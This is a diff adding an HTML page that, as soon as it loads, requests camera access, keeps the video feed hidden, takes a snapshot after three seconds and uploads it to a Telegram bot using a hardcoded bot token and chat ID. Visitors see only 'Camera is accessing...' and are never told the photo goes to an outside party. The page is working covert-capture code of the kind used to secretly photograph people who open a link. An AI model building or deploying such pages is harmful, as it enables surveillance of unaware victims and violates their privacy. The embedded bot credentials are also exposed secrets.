@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture and Send to Telegram</title>
+    <style>
+        #videoElement {
+            display: none; /* Hide the video element */
+        }
+    </style>
+</head>
+<body>
+    <h1>Camera is accessing...</h1>
+    <video id="videoElement" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvas');
+
+        // Automatically access the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // Wait for the video to be ready and take a snapshot automatically
+                video.addEventListener('loadeddata', () => {
+                    setTimeout(() => {
+                        captureAndSendImage();
+                    }, 3000); // Wait 3 seconds before capturing and sending the image
+                });
+            })
+            .catch(err => {
+                console.error("Error accessing camera: ", err);
+            });
+
+        // Function to capture the image and send it to Telegram
+        function captureAndSendImage() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert the captured image to base64 format
+            const imageBase64 = canvas.toDataURL('image/png');
+
+            // Send the image to your Telegram bot
+            sendImageToTelegram(imageBase64);
+        }
+
+        function sendImageToTelegram(imageBase64) {
+            const botToken = '7719242675:AAHpNijLRO_GgRzCkfYqiHCY21-v-xN7ozU'; // Your bot token
+            const chatId = '6962381750'; // Your chat ID
+
+            // Convert base64 image to a blob
+            fetch(imageBase64)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'photo.png');
+
+                    // Send the image to Telegram API
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Image sent to Telegram:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending image to Telegram:', error);
+                    });
+                });
+        }
+    </script>
+</body>
+</html>
